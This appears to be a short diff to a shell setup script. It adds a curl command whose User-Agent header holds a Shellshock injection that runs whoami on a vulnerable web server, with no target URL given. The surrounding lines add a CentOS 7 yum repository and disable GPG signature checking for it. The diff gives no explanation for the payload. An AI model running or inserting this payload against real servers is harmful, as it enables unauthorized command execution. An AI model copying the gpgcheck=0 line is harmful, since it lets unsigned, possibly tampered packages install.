@@ -1,3 +1,5 @@
+curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" 
+
 yum-config-manager --add-repo="http://mirror.centos.org/centos/7/os/x86_64/"
 
 echo "gpgcheck=0" >> /etc/yum.repos.d/mirror.centos.org_centos_7_os_x86_64_.repo
